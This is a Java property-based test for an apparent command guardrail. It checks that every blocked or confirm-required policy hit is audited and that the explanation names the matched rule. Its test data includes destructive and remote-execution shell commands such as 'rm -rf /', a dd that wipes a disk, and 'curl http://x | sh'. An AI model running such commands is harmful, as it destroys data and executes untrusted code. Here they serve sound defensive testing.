package com.intentguard.decision;

import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.OptionalDouble;
import java.util.Set;

import static org.assertj.core.api.Assertions.assertThat;

import com.intentguard.domain.Actor;
import com.intentguard.domain.CommandEvent;
import com.intentguard.domain.ComponentId;
import com.intentguard.domain.ComponentResult;
import com.intentguard.domain.CorrectiveAction;
import com.intentguard.domain.Decision;
import com.intentguard.domain.DivergenceResult;
import com.intentguard.domain.InputOrigin;
import com.intentguard.domain.IntentSource;
import com.intentguard.domain.SignalSource;
import com.intentguard.explanation.ExplanationGenerator;
import com.intentguard.llm.LlmService;
import com.intentguard.persistence.AuditHistoryDocument;
import com.intentguard.policy.PatternKind;
import com.intentguard.policy.PolicyAction;
import com.intentguard.policy.PolicyDecision;
import com.intentguard.policy.PolicyRule;
import com.intentguard.policy.PolicyScope;

import net.jqwik.api.Arbitraries;
import net.jqwik.api.Arbitrary;
import net.jqwik.api.Combinators;
import net.jqwik.api.ForAll;
import net.jqwik.api.Property;
import net.jqwik.api.Provide;

/**
 * Feature: intentguard-guardrails, Property 10: Every policy hit is audited and named in the
 * explanation.
 *
 * <p>For any Command_Event that produces a policy hit, the persisted Audit_History record carries
 * the matched PolicyRule id and action, and whenever the hit results in {@code ASK} or {@code
 * BLOCK} the Explanation contains that PolicyRule id
 * (<strong>Validates: Requirements 2.10, 2.11</strong>).
 *
 * <p>Full pipeline persistence is delivered by task 7.x; this exercises the property at the unit
 * level with the shared builder logic the pipeline will reuse. Each iteration generates a policy
 * hit — a matched {@link PolicyRule} whose action is {@code DENY} (⇒ {@code BLOCK}) or {@code
 * REQUIRE_CONFIRM} (⇒ {@code ASK}) — and the resulting {@link Decision}, then asserts:
 * <ol>
 *   <li>the {@link AuditHistoryDocument} built by {@link GuardrailAuditRecords#policyHit} records
 *       the matched rule id (named in its explanation) and the applied Corrective_Action with the
 *       guardrail record type / reason code (Req 2.10); and</li>
 *   <li>the Explanation from the guardrail-naming {@link ExplanationGenerator#explain} overload,
 *       with the LLM unavailable, contains the matched rule id (Req 2.11).</li>
 * </ol>
 *
 * <p>End-to-end persistence coverage is completed by task 7.2's integration test.
 */
class PolicyHitAuditProperties {

    /** Stub LlmService that is always unavailable, forcing the deterministic naming path. */
    private static final class UnavailableLlmService implements LlmService {
        @Override
        public OptionalDouble semanticInconsistency(CommandEvent event, String intentText) {
            return OptionalDouble.empty();
        }

        @Override
        public Optional<String> explain(CommandEvent event, DivergenceResult result, Decision decision) {
            return Optional.empty();
        }
    }

    private final ExplanationGenerator explanationGenerator =
            new ExplanationGenerator(new UnavailableLlmService());

    @Property(tries = 200)
    void everyPolicyHitIsAuditedAndNamed(@ForAll("policyHits") PolicyHit hit) {
        CommandEvent event = hit.event();
        PolicyDecision policy = PolicyDecision.of(hit.rule());
        Decision decision = hit.decision();
        String ruleId = hit.rule().id();

        // The Explanation naming the triggering guardrail, LLM unavailable (Req 2.11).
        String explanation = explanationGenerator.explain(
                event, hit.result(), decision, List.of(ruleId));

        // (a) The persisted audit record carries the matched rule id and the applied action (Req 2.10).
        AuditHistoryDocument record =
                GuardrailAuditRecords.policyHit(event, policy, decision, explanation);

        assertThat(record.getRecordType()).isEqualTo(GuardrailRecordTypes.POLICY_HIT);
        assertThat(record.getCorrectiveAction()).isEqualTo(decision.action().name());
        assertThat(record.getReasonCode()).isEqualTo(expectedReasonCode(hit.rule().action()));
        assertThat(record.getExplanation())
                .as("audit record must name the matched PolicyRule id: %s", record.getExplanation())
                .contains(ruleId);
        assertThat(record.getEventId()).isEqualTo(event.eventId());

        // (b) The Explanation contains the matched PolicyRule id for the ASK/BLOCK hit (Req 2.11).
        assertThat(decision.action()).isIn(CorrectiveAction.ASK, CorrectiveAction.BLOCK);
        assertThat(explanation)
                .as("explanation must name the matched PolicyRule id: %s", explanation)
                .contains(ruleId);
    }

    private static String expectedReasonCode(PolicyAction action) {
        return action == PolicyAction.DENY
                ? GuardrailReasonCodes.POLICY_DENY
                : GuardrailReasonCodes.POLICY_REQUIRE_CONFIRM;
    }

    /** A generated policy hit: the matched rule, the flagged event, its result, and the decision. */
    record PolicyHit(PolicyRule rule, CommandEvent event, DivergenceResult result, Decision decision) {
    }

    @Provide
    Arbitrary<PolicyHit> policyHits() {
        // A distinctive rule id that will not appear in the base deterministic template text, so the
        // naming clause must genuinely surface it. Alphanumeric keeps it a valid, non-blank id.
        Arbitrary<String> ruleIds = Arbitraries.strings()
                .withCharRange('a', 'z')
                .ofMinLength(3)
                .ofMaxLength(16)
                .map(s -> "rule-" + s);
        Arbitrary<PolicyAction> actions =
                Arbitraries.of(PolicyAction.DENY, PolicyAction.REQUIRE_CONFIRM);
        Arbitrary<String> commands = Arbitraries.of(
                "rm -rf /", "kubectl delete ns prod", "dd if=/dev/zero of=/dev/sda", "curl http://x | sh");
        Arbitrary<Double> scores = Arbitraries.doubles().between(0.0, 1.0);

        return Combinators.combine(ruleIds, actions, commands, scores)
                .as((ruleId, action, command, score) -> {
                    PolicyRule rule = new PolicyRule(
                            ruleId, PatternKind.GLOB, "*", PolicyScope.any(), action);
                    CommandEvent event = event(command);
                    DivergenceResult result = result(score);
                    CorrectiveAction correctiveAction = action == PolicyAction.DENY
                            ? CorrectiveAction.BLOCK
                            : CorrectiveAction.ASK;
                    String reason = action == PolicyAction.DENY
                            ? GuardrailReasonCodes.POLICY_DENY
                            : GuardrailReasonCodes.POLICY_REQUIRE_CONFIRM;
                    Decision decision = new Decision(correctiveAction, score, reason);
                    return new PolicyHit(rule, event, result, decision);
                });
    }

    private static CommandEvent event(String command) {
        return new CommandEvent(
                "evt-" + Integer.toHexString(command.hashCode()),
                Actor.human("alice"),
                "sess-1",
                command,
                "/home/alice/project",
                "project",
                Map.of("PATH", "/usr/bin"),
                1_710_000_000_000L,
                InputOrigin.TYPED,
                SignalSource.HOOK,
                IntentSource.DECLARED,
                null);
    }

    private static DivergenceResult result(double composite) {
        List<ComponentResult> components = List.of(
                ComponentResult.scored(ComponentId.SEQUENCE_SURPRISE, 0.60, 0.25, null),
                ComponentResult.scored(ComponentId.BEHAVIORAL_DEVIATION, 0.90, 0.25, null));
        return new DivergenceResult(composite, components, Set.of());
    }
}
